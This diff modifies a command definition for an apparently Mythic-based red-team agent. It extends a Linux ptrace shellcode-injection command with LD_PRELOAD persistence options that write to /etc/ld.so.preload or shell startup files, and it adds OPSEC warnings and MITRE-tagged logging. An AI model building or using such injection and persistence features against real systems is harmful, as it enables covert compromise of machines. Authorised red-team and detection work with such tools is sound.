@@ -6,6 +6,8 @@ import (
 	"fmt"
 	"strings"
 
+	"path/filepath"
+
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
 )
 
@@ -15,9 +17,10 @@ func init() {
 		Description:         "Linux process injection via ptrace syscall — attach to a target process, write shellcode, and execute it",
 		HelpString:          "ptrace-inject -action check | ptrace-inject -pid <PID> -filename <shellcode>",
 		Version:             1,
-		MitreAttackMappings: []string{"T1055.008"}, // Process Injection: Ptrace System Calls
-		SupportedUIFeatures: []string{},
+		MitreAttackMappings: []string{"T1055.008", "T1574.006"}, // Ptrace + LD_PRELOAD Hijacking
+		SupportedUIFeatures: []string{"process_browser:inject"},
 		Author:              "@galoryber",
+		AssociatedBrowserScript: &agentstructs.BrowserScript{ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "ptraceinject_new.js"), Author: "@galoryber"},
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{agentstructs.SUPPORTED_OS_LINUX},
 		},
@@ -26,8 +29,8 @@ func init() {
 				Name:             "action",
 				ModalDisplayName: "Action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Description:      "check: show ptrace config and candidate processes. inject: perform shellcode injection.",
-				Choices:          []string{"inject", "check"},
+				Description:      "check: show ptrace config. inject: shellcode injection. ld-preload: list LD_PRELOAD settings. ld-install: install LD_PRELOAD persistence. ld-remove: remove LD_PRELOAD entry.",
+				Choices:          []string{"inject", "check", "ld-preload", "ld-install", "ld-remove"},
 				DefaultValue:     "inject",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: true, GroupName: "Default", UIModalPosition: 0},
@@ -69,11 +72,12 @@ func init() {
 				},
 			},
 			{
-				Name:             "pid",
-				ModalDisplayName: "Target PID",
-				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
-				Description:      "The process ID to inject shellcode into",
-				DefaultValue:     0,
+				Name:                 "pid",
+				ModalDisplayName:     "Target PID",
+				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:          "The process ID to inject shellcode into",
+				DynamicQueryFunction: getProcessList,
+				DefaultValue:         "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: true, GroupName: "Default", UIModalPosition: 2},
 					{ParameterIsRequired: true, GroupName: "New File", UIModalPosition: 2},
@@ -104,13 +108,42 @@ func init() {
 					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 4},
 				},
 			},
+			{
+				Name:             "libpath",
+				ModalDisplayName: "Library Path",
+				CLIName:          "libpath",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:      "Path to shared library for LD_PRELOAD (ld-install/ld-remove actions)",
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 5},
+				},
+			},
+			{
+				Name:             "target",
+				ModalDisplayName: "LD_PRELOAD Target",
+				CLIName:          "target",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
+				Description:      "Where to install LD_PRELOAD: auto (root=ld.so.preload, user=bashrc), or specific file",
+				Choices:          []string{"auto", "ld.so.preload", "bashrc", "bash_profile", "profile", "zshrc", "zshenv"},
+				DefaultValue:     "auto",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 6},
+				},
+			},
 		},
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
 			action, _ := taskData.Args.GetStringArg("action")
-			pid, _ := taskData.Args.GetNumberArg("pid")
+			pid, _ := taskData.Args.GetStringArg("pid")
 			msg := "OPSEC WARNING: "
-			if action == "inject" {
-				msg += fmt.Sprintf("ptrace injection into PID %d. Uses PTRACE_ATTACH + PTRACE_POKETEXT — detectable by ptrace monitoring, seccomp filters, and Yama LSM.", int(pid))
+			if action == "ld-install" {
+				libpath, _ := taskData.Args.GetStringArg("libpath")
+				target, _ := taskData.Args.GetStringArg("target")
+				msg += fmt.Sprintf("Installing LD_PRELOAD persistence (%s → %s). Modifies system/shell config files. File integrity monitoring (AIDE, OSSEC, Tripwire) and audit rules on /etc/ld.so.preload will detect this.", libpath, target)
+			} else if action == "ld-remove" {
+				msg += "Removing LD_PRELOAD entry. File modification may trigger audit alerts."
+			} else if action == "inject" {
+				msg += fmt.Sprintf("ptrace injection into PID %s. Uses PTRACE_ATTACH + PTRACE_POKETEXT — detectable by ptrace monitoring, seccomp filters, and Yama LSM.", pid)
 			} else {
 				msg += "ptrace capability check — enumerates ptrace scope and candidate processes."
 			}
@@ -124,10 +157,10 @@ func init() {
 		},
 		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
 			action, _ := taskData.Args.GetStringArg("action")
-			pid, _ := taskData.Args.GetNumberArg("pid")
+			pid, _ := taskData.Args.GetStringArg("pid")
 			msg := "OPSEC AUDIT: ptrace "
 			if action == "inject" {
-				msg += fmt.Sprintf("injection queued for PID %d. Artifact registered.", int(pid))
+				msg += fmt.Sprintf("injection queued for PID %s. Artifact registered.", pid)
 			} else {
 				msg += "check configured. Process enumeration will occur."
 			}
@@ -177,7 +210,7 @@ func init() {
 					return response
 				}
 
-				pid, err := taskData.Args.GetNumberArg("pid")
+				pid, err := parsePIDFromArg(taskData)
 				if err != nil || pid <= 0 {
 					response.Success = false
 					response.Error = "Invalid PID specified (must be greater than 0)"
@@ -194,14 +227,14 @@ func init() {
 				}
 
 				displayParams := fmt.Sprintf("Inject %d bytes → PID %d (restore=%v, timeout=%ds)",
-					len(shellcode), int(pid), restore, timeout)
+					len(shellcode), pid, restore, timeout)
 				response.DisplayParams = &displayParams
 				createArtifact(taskData.Task.ID, "Process Inject",
-					fmt.Sprintf("PTRACE_ATTACH/PTRACE_POKETEXT into PID %d (%d bytes)", int(pid), len(shellcode)))
+					fmt.Sprintf("PTRACE_ATTACH/PTRACE_POKETEXT into PID %d (%d bytes)", pid, len(shellcode)))
 
 				params := map[string]interface{}{
 					"action":        "inject",
-					"pid":           int(pid),
+					"pid":           pid,
 					"shellcode_b64": base64.StdEncoding.EncodeToString(shellcode),
 					"restore":       restore,
 					"timeout":       timeout,
@@ -219,7 +252,7 @@ func init() {
 				return response
 			}
 
-			pid, err := taskData.Args.GetNumberArg("pid")
+			pid, err := parsePIDFromArg(taskData)
 			if err != nil || pid <= 0 {
 				response.Success = false
 				response.Error = "Invalid PID specified (must be greater than 0)"
@@ -237,14 +270,14 @@ func init() {
 			}
 
 			displayParams := fmt.Sprintf("Shellcode: %s (%d bytes) → PID %d (restore=%v, timeout=%ds)",
-				filename, len(fileContents), int(pid), restore, timeout)
+				filename, len(fileContents), pid, restore, timeout)
 			response.DisplayParams = &displayParams
 			createArtifact(taskData.Task.ID, "Process Inject",
-				fmt.Sprintf("PTRACE_ATTACH/PTRACE_POKETEXT into PID %d (%d bytes)", int(pid), len(fileContents)))
+				fmt.Sprintf("PTRACE_ATTACH/PTRACE_POKETEXT into PID %d (%d bytes)", pid, len(fileContents)))
 
 			params := map[string]interface{}{
 				"action":        "inject",
-				"pid":           int(pid),
+				"pid":           pid,
 				"shellcode_b64": base64.StdEncoding.EncodeToString(fileContents),
 				"restore":       restore,
 				"timeout":       timeout,
@@ -257,6 +290,37 @@ func init() {
 			}
 			taskData.Args.SetManualArgs(string(paramsJSON))
 
+			return response
+		},
+		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
+			response := agentstructs.PTTaskProcessResponseMessageResponse{
+				TaskID:  processResponse.TaskData.Task.ID,
+				Success: true,
+			}
+			responseText, ok := processResponse.Response.(string)
+			if !ok || responseText == "" {
+				return response
+			}
+			action, _ := processResponse.TaskData.Args.GetStringArg("action")
+			switch action {
+			case "ld-install":
+				if strings.Contains(responseText, "installed") {
+					libpath, _ := processResponse.TaskData.Args.GetStringArg("libpath")
+					tagTask(processResponse.TaskData.Task.ID, "PERSIST",
+						fmt.Sprintf("LD_PRELOAD persistence installed: %s (T1574.006)", libpath))
+				}
+			case "ld-remove":
+				if strings.Contains(responseText, "removed") {
+					logOperationEvent(processResponse.TaskData.Task.ID,
+						"[CLEANUP] LD_PRELOAD persistence removed (T1574.006)", false)
+				}
+			case "inject":
+				if strings.Contains(responseText, "success") || strings.Contains(responseText, "Success") {
+					pid, _ := processResponse.TaskData.Args.GetStringArg("pid")
+					tagTask(processResponse.TaskData.Task.ID, "EXECUTION",
+						fmt.Sprintf("Ptrace injection into PID %s (T1055.008)", pid))
+				}
+			}
 			return response
 		},
 	})
